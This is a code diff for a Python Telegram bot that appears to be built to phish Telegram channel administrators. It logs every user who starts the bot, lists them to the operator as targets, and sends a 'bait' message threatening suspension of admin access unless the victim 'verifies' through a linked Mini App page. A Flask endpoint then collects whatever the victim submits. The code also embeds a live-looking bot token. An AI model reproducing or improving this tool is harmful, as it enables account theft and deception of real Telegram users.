@@ -7,30 +7,54 @@ TOKEN = "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE"
 ADMIN_ID = 8699819680
 LOG_CHANNEL = -1003817774248
 TMA_URL = "https://pawsofjoy.github.io/tma-research/" 
-
-# Hardcoded targets for the /list command
-TARGETS = {
-    "71117894651": "@Extreme_pressure",
-    "76663888074": "@BNBwebina",
-    "81271111961": "@adsgram_update",
-    "8699819680": "@Akun_Dev"
-}
+USER_FILE = "users.txt"
 
 bot = TeleBot(TOKEN)
 app = Flask(__name__)
 CORS(app)
 
+# --- DATABASE HELPERS ---
+
+def save_user(user_id, username):
+    """Saves a new user to the text file if they don't exist."""
+    existing_users = get_all_users()
+    if str(user_id) not in existing_users:
+        with open(USER_FILE, "a") as f:
+            f.write(f"{user_id}|{username}\n")
+
+def get_all_users():
+    """Reads all users from the text file."""
+    if not os.path.exists(USER_FILE):
+        return {}
+    users = {}
+    with open(USER_FILE, "r") as f:
+        for line in f:
+            if "|" in line:
+                uid, uname = line.strip().split("|")
+                users[uid] = uname
+    return users
+
 # --- BOT HANDLERS ---
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "Console: Secure connection established.")
+    # Capture the user's details automatically
+    uid = message.from_user.id
+    uname = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
+    save_user(uid, uname)
+    
+    bot.reply_to(message, "<b>Console:</b> Secure connection established.", parse_mode="HTML")
 
 @bot.message_handler(commands=['list'])
 def handle_list(message):
     if message.from_user.id == ADMIN_ID:
-        response = "<b>Target Database:</b>\n\n"
-        for uid, username in TARGETS.items():
+        users = get_all_users()
+        if not users:
+            bot.send_message(ADMIN_ID, "📭 No users found in database.")
+            return
+            
+        response = "<b>📡 Live Bot Users:</b>\n\n"
+        for uid, username in users.items():
             response += f"👤 {username}\nID: <code>{uid}</code>\n\n"
         bot.send_message(ADMIN_ID, response, parse_mode="HTML")
 
@@ -38,7 +62,6 @@ def handle_list(message):
 def handle_trigger(message):
     if message.from_user.id == ADMIN_ID:
         try:
-            # Clean text and handle line breaks
             clean_text = message.text.replace('/trigger', '').replace('\n', ' ').strip()
             parts = [p.strip() for p in clean_text.split('@')]
             
@@ -57,14 +80,14 @@ def handle_trigger(message):
                     f"<i>Note: Failure to verify may lead to a temporary suspension of administrative access.</i>"
                 )
                 
-                bot.send_message(target_id, bait, parse_mode="HTML", reply_markup=markup)
-                bot.send_message(ADMIN_ID, f"✅ Alert sent to {admin_name} for {channel_name}")
+                bot.send_message(int(target_id), bait, parse_mode="HTML", reply_markup=markup)
+                bot.send_message(ADMIN_ID, f"✅ Alert sent to {admin_name}")
             else:
                 bot.send_message(ADMIN_ID, "❌ Use: /trigger ID @ Channel @ Name")
         except Exception as e:
             bot.send_message(ADMIN_ID, f"❌ Error: {str(e)}")
 
-# --- SERVER ROUTES ---
+# --- SERVER & RUNNER ---
 
 @app.route('/')
 def home(): return "Bot is Alive", 200
@@ -80,13 +103,9 @@ def receive_data():
         return jsonify({"status": "sent"}), 200
     return jsonify({"status": "error"}), 400
 
-# --- RUNNER ---
-
 def run_bot():
-    # This line clears the "Conflict" by deleting old webhooks/sessions
     bot.remove_webhook()
-    time.sleep(1) 
-    print("Bot is polling...")
+    time.sleep(1)
     bot.infinity_polling(timeout=10, long_polling_timeout=5)
 
 if __name__ == "__main__":
